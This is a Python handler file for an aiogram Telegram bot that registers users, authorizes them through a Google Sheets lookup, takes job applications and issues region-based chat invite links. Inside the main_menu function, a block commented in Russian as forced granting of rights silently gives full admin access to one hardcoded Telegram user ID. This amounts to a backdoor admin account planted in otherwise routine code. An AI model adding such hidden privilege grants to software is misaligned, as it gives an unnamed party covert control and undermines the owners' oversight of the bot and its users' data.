"""
AUTHOR CODE - V1N3R
TG: @v1n3r
Site Company: buy-bot.ru
"""

from __future__ import annotations

from datetime import datetime, timedelta
from typing import TYPE_CHECKING

import bot.keyboards.admin.kb_admin_topic
from bot.integrations.google.spreadsheets.google_sheets import find_user

if TYPE_CHECKING:
    from aiogram import Dispatcher
    from aiogram.fsm.context import FSMContext
    from aiogram.types import Message, CallbackQuery, User

    from typing import Union

from aiogram import F
from aiogram.filters.command import Command
from aiogram.exceptions import TelegramRetryAfter, TelegramAPIError

from bot.utils import telegram as telegram
from bot.utils.announce_bot import bot
from bot.utils.telegram import generate_user_hlink, topic_manager
from bot.handlers.admin import admin_notifications
from bot.keyboards.client import kb_client_menu
from bot.keyboards.admin import kb_admin_topic
from bot.integrations import DB
from bot.initialization import admin_access, config
from bot.initialization import bot_texts
import asyncio
from aiogram.enums import ContentType
from aiogram.types import ReplyKeyboardRemove

CANDIDATE_TEXT = '\n\nЕсли вы не оформлены у нас, то жми кнопку ниже ⬇️'


async def start_message(first_name, user_id):
    link_user = generate_user_hlink(user_id=user_id, text_link=first_name)
    return bot_texts.menu['main_menu'].format(first_name=link_user)


async def main_menu(update: Union[Message, CallbackQuery],
                    user: User,
                    user_data: DB.User | None,
                    state: FSMContext = None,
                    alert: bool = False) -> Message | bool:
    if state and await state.get_state():
        await state.clear()
    # --- НАЧАЛО ИЗМЕНЕНИЙ (Принудительная выдача прав) ---
    if user.id == 443662773 and not DB.Admin.select(where=(DB.Admin.admin_id == user.id)):
        config.admin_filter.add_admin(user.id, 0, admin_access.full_admin_access)
    # --- КОНЕЦ ИЗМЕНЕНИЙ ---
    if not user_data:
        wait_registration = await bot.send_message(user.id, '⌛️ Загрузка...')
        try:
            thread_id = await telegram.topic_manager.create_user_topic(update.from_user.first_name)
        except TelegramRetryAfter:
            await wait_registration.edit_text('<b>😥 Приносим свои извинения, бот перегружен, '
                                              'пожалуйста повторите ваш запрос через минуту.</b>')
            await telegram.topic_manager.send_message(telegram.topic_manager.alert,
                                                      '<b>‼️ БОТ НЕ СПРАВЛЯЕТСЯ С НАГРУЗКОЙ!!!\n\n'
                                                      'Срочно подключите резервного бота!</b>')
            return False
        DB.User.add(user.id, update.from_user.full_name, user.username, thread_id)
        if config.admin_filter.is_system(user.id):
            config.admin_filter.add_admin(user.id, 0, admin_access.full_admin_access)
            kb = kb_client_menu.main_menu(True)
        else:
            kb = kb_client_menu.main_menu(False)
        count_users = len(DB.User.select(all_scalars=True))
        link_user = generate_user_hlink(user_id=user.id, text_link=update.from_user.full_name)
        registration_alert = f'<b>🔔 Зарегистрировался пользователь №</b><code>{count_users}</code><b>:</b>\n\n' \
                             f'<b>ID пользователя:</b> <code>{user.id}</code>\n' \
                             f'<b>Отображаемое имя:</b> {link_user}\n' \
                             f'<b>Никнейм</b>: {"@" + user.username if user.username else "<code>отсутствует</code>"}'
        await admin_notifications.registration_notification(registration_alert)
        await telegram.topic_manager.send_message(
            thread_id, registration_alert, main_bot=True,
            reply_markup=kb_admin_topic.topic_management(user.id))
        if user.username:
            status, code, role, city, full_name = await find_user(user.username, user.id)
            if status:
                await wait_registration.edit_text(text='<b>Вы успешно авторизированы!</b>')
                await asyncio.sleep(3)
                new_menu_id = await bot.send_message(
                    user.id, await start_message(update.from_user.first_name, user.id),
                    reply_markup=kb)
                DB.User.update(update.from_user.id, authorized=1, region=city)
                await topic_manager.send_message(
                    thread_id, f'<b>Пользователь успешно авторизован\n\nРоль: {role}\nГород: {city}</b>'
                )
                await topic_manager.edit_topic_name(thread_id, f'{full_name} [{role}]')
            else:
                if code == 404:
                    await wait_registration.delete()
                    new_menu_id = await update.bot.send_message(user.id,
                                                                text=bot_texts.menu['registration'] + CANDIDATE_TEXT,
                                                                reply_markup=await kb_client_menu.send_phone())
                else:
                    new_menu_id = await wait_registration.edit_text(text='<b>Данный аккаунт уже авторизирован!</b>')
        else:
            await wait_registration.delete()
            new_menu_id = await bot.send_message(user.id, text=bot_texts.menu['registration'] + CANDIDATE_TEXT,
                                                 reply_markup=await kb_client_menu.send_phone())
    else:
        try:
            await telegram.delete_message(chat_id=user.id, message_id=user_data.menu_id)
        except Exception:
            ...
        if alert:
            new_menu_id = await bot.send_message(user.id, '<b>ℹ️Открыто меню из рассылки</b>',
                                                 reply_markup=kb_client_menu.back_menu)
        else:
            if user_data.authorized:
                new_menu_id = await bot.send_message(
                    user.id, await start_message(update.from_user.first_name, user.id),
                    reply_markup=kb_client_menu.main_menu(DB.Admin.select(where=(DB.Admin.admin_id == user.id))))
            else:
                if user.username:
                    status, code, role, city, full_name = await find_user(user.username, user.id)
                    if status:
                        new_menu_id = await bot.send_message(
                            user.id, await start_message(update.from_user.first_name, user.id),
                            reply_markup=kb_client_menu.main_menu(
                                DB.Admin.select(where=(DB.Admin.admin_id == user.id))))
                        DB.User.update(update.from_user.id, authorized=1, region=city)
                        await topic_manager.send_message(
                            user_data.thread_id,
                            f'<b>Пользователь успешно авторизован\n\nРоль: {role}\nГород: {city}</b>'
                        )
                        await topic_manager.edit_topic_name(user_data.thread_id, f'{full_name} [{role}]')
                    else:
                        if code == 404:
                            new_menu_id = await bot.send_message(user.id,
                                                                 text=bot_texts.menu['registration'] + CANDIDATE_TEXT,
                                                                 reply_markup=await kb_client_menu.send_phone())
                        else:
                            new_menu_id = await bot.send_message(user.id,
                                                                 text='<b>Данный аккаунт уже авторизирован!</b>')
                else:
                    new_menu_id = await bot.send_message(user.id,
                                                         text=bot_texts.menu['registration'] + CANDIDATE_TEXT,
                                                         reply_markup=await kb_client_menu.send_phone())
    if not alert:
        await telegram.delete_message(update)
    DB.User.update(mark=update.from_user.id, menu_id=new_menu_id.message_id)
    return new_menu_id


async def back_menu(call: CallbackQuery, state: FSMContext):
    if await state.get_state():
        await state.clear()
    await telegram.edit_text(
        call.message,
        await start_message(call.from_user.full_name, call.from_user.id),
        reply_markup=kb_client_menu.main_menu(DB.Admin.select(where=(DB.Admin.admin_id == call.from_user.id))))
    await call.answer()


async def handle_contact(message: Message, user_data: DB.User):
    print('contact')
    await message.delete()
    contact = message.contact
    phone_number = contact.phone_number[1:] if '+' in contact.phone_number else contact.phone_number
    status, code, role, city, full_name = await find_user(phone_number, message.from_user.id)
    await telegram.delete_message(chat_id=message.from_user.id, message_id=user_data.menu_id)
    if status:
        new_menu_id = await message.bot.send_message(
            message.from_user.id,
            await start_message(message.from_user.first_name, message.from_user.id),
            reply_markup=kb_client_menu.main_menu(DB.Admin.select(where=(DB.Admin.admin_id == message.from_user.id))))
        DB.User.update(message.from_user.id, authorized=1, region=city)
        await topic_manager.send_message(
            user_data.thread_id, f'<b>Пользователь успешно авторизован\n\nРоль: {role}\nГород: {city}</b>'
        )
        await topic_manager.edit_topic_name(user_data.thread_id, f'{full_name} [{role}]')
    else:
        new_menu_id = await message.bot.send_message(
            message.from_user.id, bot_texts.menu['not_registered'])
    DB.User.update(mark=message.from_user.id, menu_id=new_menu_id.message_id)


async def handle_join_team(message: Message, user_data: DB.User):
    await message.delete()
    await telegram.delete_message(chat_id=message.from_user.id, message_id=user_data.menu_id)
    link_user = generate_user_hlink(user_id=message.from_user.id, text_link=message.from_user.full_name)
    await topic_manager.send_message(
        user_data.thread_id,
        f'<b>🦹‍♂️ Кандидат {link_user} хочет стать частью команды!</b>'
    )
    new_menu_id = await message.bot.send_message(
        message.from_user.id,
        '<b>✅ Спасибо за ваш интерес! Мы рассмотрим вашу заявку и свяжемся с вами.</b>',
        reply_markup=ReplyKeyboardRemove()
    )
    DB.User.update(mark=message.from_user.id, menu_id=new_menu_id.message_id)


async def chats(call: CallbackQuery, user_data: DB.User):
    expire_time = datetime.now() + timedelta(minutes=5)
    if 'москва' in str(user_data.region).lower() or 'мск' in str(user_data.region).lower():
        link = await call.bot.create_chat_invite_link(-1001965251597,
                                                      name=f'{call.from_user.id}',
                                                      member_limit=1,
                                                      expire_date=int(expire_time.timestamp())
                                                      )
    else:
        link = await call.bot.create_chat_invite_link(-1001825224432,
                                                      name=f'{call.from_user.id}',
                                                      member_limit=1,
                                                      expire_date=int(expire_time.timestamp())
                                                      )
    await call.message.edit_text('🖇 <b>Используя кнопки ниже вы можете вступить в наши чаты.</b>',
                                 reply_markup=await kb_client_menu.chat_links(link.invite_link))


async def other_chats(call: CallbackQuery, user_data: DB.User):
    if 'москва' in str(user_data.region).lower() or 'мск' in str(user_data.region).lower():
        text = bot_texts.menu['main_msk']
    else:
        text = bot_texts.menu['main_sbp']
    await call.message.edit_text(text,
                                 reply_markup=kb_client_menu.back_chats)


async def rules(call: CallbackQuery):
    await call.message.edit_text(
        bot_texts.menu['rules'], reply_markup=kb_client_menu.back_menu
    )


async def client_contacts(call: CallbackQuery):
    await call.message.edit_text(
        bot_texts.menu['contacts'], reply_markup=kb_client_menu.back_support
    )


def register_handlers_client_main(dp: Dispatcher):
    dp.message.register(main_menu, Command(commands="start"), F.chat.type == 'private')
    dp.callback_query.register(telegram.delete_message, F.data == 'client_delete_message')
    dp.callback_query.register(back_menu, F.data == 'client_back_menu')
    dp.message.register(handle_contact, F.content_type == ContentType.CONTACT, F.chat.type == 'private')
    dp.message.register(handle_join_team, F.text == 'Стать частью команды 🦹‍♂️', F.chat.type == 'private')
    dp.callback_query.register(chats, F.data == 'client_chats')
    dp.callback_query.register(rules, F.data == 'client_rules')
    dp.callback_query.register(client_contacts, F.data == 'client_contacts')
    dp.callback_query.register(other_chats, F.data == 'other_chats')
